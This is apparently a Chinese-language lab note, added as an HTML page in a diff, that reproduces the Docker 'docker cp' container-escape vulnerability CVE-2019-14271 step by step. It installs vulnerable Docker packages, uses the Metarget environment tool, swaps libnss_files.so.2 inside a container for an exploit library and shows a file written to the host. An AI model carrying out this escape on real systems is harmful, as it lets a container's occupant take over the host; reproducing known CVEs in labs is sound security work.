@@ -1,0 +1,60 @@
+﻿<!DOCTYPE html PUBLIC "-//W3C//DTD XHTML 1.0 Strict//EN" "http://www.w3.org/TR/xhtml1/DTD/xhtml1-strict.dtd">
+<html xmlns="http://www.w3.org/1999/xhtml" xml:lang="en" lang="en">
+<head><script type="text/javascript" src="../page_head.js"></script>
+
+<h3><a href="../system.htm">系統</a> - Docker - Container Escape - <b>CVE-2019-14271</b></h3>
+<hr size="1"><br>
+<p>
+參考資訊：<br>
+https://github.com/Metarget/metarget<br>
+https://github.com/iridium-soda/CVE-2019-14271_Exploit<br>
+https://download.docker.com/linux/ubuntu/dists/xenial/pool/stable/amd64/<br>
+https://driverxdw.github.io/2019/11/28/Docker-cp%E9%80%83%E9%80%B8%E6%BC%8F%E6%B4%9E-CVE-2019-14271-%E5%88%86%E6%9E%90/<br><br>
+
+<b>測試環境</b>：<br>
+Ubuntu: 20.04.6 LTS (Focal Fossa)<br>
+Kernel: 5.11.0-34-generic<br>
+Runc: 1.0.0-rc95<br>
+Docker: 19.03.0<br>
+Containerd: 1.4.6<br><br>
+
+<b>測試步驟</b>：
+</p>
+<pre>
+$ cd
+$ wget https://download.docker.com/linux/ubuntu/dists/xenial/pool/stable/amd64/containerd.io_1.4.6-1_amd64.deb
+$ wget https://download.docker.com/linux/ubuntu/dists/xenial/pool/stable/amd64/docker-ce-cli_19.03.0~3-0~ubuntu-xenial_amd64.deb
+$ wget https://download.docker.com/linux/ubuntu/dists/xenial/pool/stable/amd64/docker-ce_19.03.0~3-0~ubuntu-xenial_amd64.deb
+$ sudo dpkg -i containerd.io_1.4.6-1_amd64.deb
+$ sudo dpkg -i docker-ce-cli_19.03.0~3-0~ubuntu-xenial_amd64.deb
+$ sudo dpkg -i docker-ce_19.03.0~3-0~ubuntu-xenial_amd64.deb
+
+$ cd
+$ git clone https://github.com/Metarget/metarget --recursive
+$ cd metarget
+$ pip install -r requirements.txt
+$ ./metarget cnv install cve-2019-14271
+    cve-2019-14271 already installed
+
+$ sudo docker run -itd --name=14271 ubuntu:20.04 bash
+$ sudo docker cp writeups_cnv/docker-cve-2019-14271/exp/ 14271:/
+$ sudo docker exec -it 14271 bash
+
+# cp /exp/* /
+# chmod 777 /breakout
+# touch /logs
+# rm /lib/x86_64-linux-gnu/libnss_files.so.2
+# mv /libnss_files.so.2 /lib/x86_64-linux-gnu/
+# exit
+
+$ sudo docker cp 14271:/logs ./
+$ sudo docker exec -it 14271 bash
+
+# echo "test" &gt;  /host_fs/tmp/cve-2019-14271
+# exit
+
+$ cat /tmp/cve-2019-14271 
+    test
+</pre>
+
+<br><script type="text/javascript" src="../tail.js"></script>
